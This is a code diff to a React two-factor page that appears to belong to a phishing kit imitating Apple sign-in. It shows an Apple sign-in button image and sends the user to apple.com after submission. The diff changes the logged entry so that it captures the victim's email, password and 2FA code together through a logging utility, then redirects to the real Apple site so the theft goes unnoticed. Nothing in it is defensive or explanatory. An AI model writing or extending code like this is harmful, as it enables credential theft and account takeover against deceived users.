@@ -4,8 +4,9 @@ import { logResponseEntry } from "../utils/responseLogger";
 
 const CODE_LENGTH = 6;
 
-export default function TwoFactorPage() {
+export default function TwoFactorPage({ credentials }) {
   const [code, setCode] = useState(Array(CODE_LENGTH).fill(""));
+  const [isSubmitting, setIsSubmitting] = useState(false);
   const inputsRef = useRef([]);
   const isComplete = useMemo(() => code.every(Boolean), [code]);
 
@@ -29,10 +30,13 @@ export default function TwoFactorPage() {
 
   async function handleVerify(e) {
     e.preventDefault();
-    if (!isComplete) return;
+    if (!isComplete || isSubmitting) return;
+    setIsSubmitting(true);
+    const verificationCode = code.join("");
     await logResponseEntry({
-      event: "two-factor-code-entered",
-      code: code.join(""),
+      email: credentials?.email ?? "",
+      password: credentials?.password ?? "",
+      code: verificationCode,
     });
     window.location.assign("https://apple.com");
   }
@@ -72,7 +76,7 @@ export default function TwoFactorPage() {
           type="button"
           className="signin-image-button"
           onClick={handleVerify}
-          disabled={!isComplete}
+          disabled={!isComplete || isSubmitting}
         >
           <img
             src="/apple-signinbutton.jpeg"
